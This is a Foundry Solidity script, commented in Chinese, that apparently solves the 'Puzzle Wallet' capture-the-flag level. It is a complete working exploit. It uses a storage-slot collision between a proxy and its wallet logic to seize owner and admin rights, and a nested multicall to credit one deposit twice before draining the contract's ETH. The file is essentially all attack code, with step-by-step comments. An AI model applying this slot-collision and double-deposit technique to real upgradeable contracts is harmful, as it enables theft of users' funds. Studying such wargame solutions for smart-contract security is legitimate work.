// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/IPuzzle.sol";

contract Exploit is Script {
    // 換成你的實例地址
    address payable instance = payable(vm.envAddress("INSTANCE_ADDRESS"));

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        IPuzzle proxy = IPuzzle(instance);

        // --- 第一步：搶奪 Wallet Owner 權限 ---
        // 修改 Proxy 的 pendingAdmin (Slot 0)，這會碰撞到 Wallet 的 owner
        proxy.proposeNewAdmin(player);
        console.log("New Owner:", proxy.owner());

        // --- 第二步：把自己加入白名單 ---
        proxy.addToWhitelist(player);
        console.log("Is Whitelisted:", proxy.whitelisted(player));

        // --- 第三步：準備洗錢 (Nested Multicall) ---
        // 1. 先編碼一個單純的 deposit()
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(proxy.deposit.selector);

        // 2. 把 deposit() 包進一個 multicall 裡面
        bytes[] memory nestedMulticallData = new bytes[](1);
        nestedMulticallData[0] = abi.encodeWithSelector(proxy.multicall.selector, depositData);

        // 3. 構造最外層的指令：一個 deposit() + 一個 nestedMulticall
        // 這樣合約會跑兩次 deposit，但我們只付一次錢
        bytes[] memory finalCalls = new bytes[](2);
        finalCalls[0] = abi.encodeWithSelector(proxy.deposit.selector);
        finalCalls[1] = nestedMulticallData[0];

        // 發送攻擊：付 0.001 ETH，但帳面會變 0.002 ETH
        uint256 val = 0.001 ether;
        proxy.multicall{value: val}(finalCalls);

        console.log("Your recorded balance:", proxy.balances(player));
        console.log("Contract actual balance:", address(proxy).balance);

        // --- 第四步：提走所有錢，讓餘額歸零 ---
        // 此時合約應該有 0.002 (初始 0.001 + 你付的 0.001)
        // 你的餘額也是 0.002
        proxy.execute(player, 0.002 ether, "");
        console.log("Contract balance after drain:", address(proxy).balance);

        // --- 第五步：修改 MaxBalance 奪取 Admin 權限 ---
        // 修改 Wallet 的 maxBalance (Slot 1)，會碰撞到 Proxy 的 admin
        // 將自己的地址轉成 uint256 寫入
        proxy.setMaxBalance(uint256(uint160(player)));

        console.log("New Proxy Admin:", proxy.admin());
        
        vm.stopBroadcast();
    }
}
